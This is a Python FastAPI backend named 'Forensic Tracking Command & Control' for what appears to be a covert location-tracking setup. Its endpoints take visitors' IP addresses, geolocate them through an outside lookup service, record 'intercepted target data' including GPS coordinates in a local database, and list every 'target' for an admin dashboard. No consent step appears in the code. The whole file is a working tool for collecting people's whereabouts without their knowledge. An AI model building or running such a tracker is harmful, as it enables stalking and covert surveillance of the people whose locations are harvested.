import uvicorn
from fastapi import FastAPI, Request
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
from datetime import datetime
import httpx
import sqlite3
import os

app = FastAPI(title="Forensic Tracking Command & Control")

# Enable CORS for cross-origin requests from the frontend
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)

# SQLite Setup - Creates 'forensics.db' locally
DB_PATH = "forensics.db"


def init_db():
    """Initializes the SQLite database with the targets table."""
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS targets (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            latitude REAL,
            longitude REAL,
            method TEXT,
            accuracy TEXT,
            city TEXT,
            country TEXT,
            ip TEXT,
            timestamp TEXT
        )
    """)
    conn.commit()
    conn.close()


# Initialize the database on startup
init_db()


class TrackingData(BaseModel):
    latitude: float
    longitude: float
    method: str
    accuracy: str
    city: str = "Unknown"
    country: str = "Unknown"
    ip: str = "Unknown"


@app.get("/track-ip")
async def track_ip(request: Request):
    """
    Passive Inference: Extracts IP and Geolocation data.
    Added a 5-second timeout to prevent the frontend from hanging
    if the external IP API is slow.
    """
    client_ip = request.headers.get("x-forwarded-for") or request.client.host

    # Use server's public IP if client is localhost
    api_url = (
        f"http://ip-api.com/json/{client_ip}"
        if client_ip not in ["127.0.0.1", "::1"]
        else "http://ip-api.com/json/"
    )

    try:
        # Added timeout to prevent backend from hanging the client UI
        async with httpx.AsyncClient(timeout=5.0) as client:
            response = await client.get(api_url)
            return response.json()
    except Exception as e:
        # Fallback if the external API is down or times out
        return {
            "status": "fail",
            "query": client_ip,
            "lat": 0.0,
            "lon": 0.0,
            "city": "Lookup Failed",
            "country": "Unknown",
        }


@app.post("/log-target")
async def log_target(data: TrackingData):
    """
    Saves intercepted target data into the local SQLite database.
    """
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    try:
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        cursor.execute(
            """
            INSERT INTO targets (latitude, longitude, method, accuracy, city, country, ip, timestamp)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?)
        """,
            (
                data.latitude,
                data.longitude,
                data.method,
                data.accuracy,
                data.city,
                data.country,
                data.ip,
                timestamp,
            ),
        )
        conn.commit()
        conn.close()
        return {"status": "success", "message": "Target data recorded."}
    except Exception as e:
        return {"status": "error", "message": str(e)}


@app.get("/get-all-targets")
async def get_all_targets():
    """
    Fetches all records for the Admin Dashboard.
    """
    try:
        conn = sqlite3.connect(DB_PATH)
        conn.row_factory = sqlite3.Row
        cursor = conn.cursor()
        cursor.execute("SELECT * FROM targets ORDER BY timestamp DESC")
        rows = cursor.fetchall()
        conn.close()
        return [dict(row) for row in rows]
    except Exception as e:
        return []


if __name__ == "__main__":
    # Ensure port 8000 is used to match the frontend API_BASE
    uvicorn.run(app, host="127.0.0.1", port=8000)
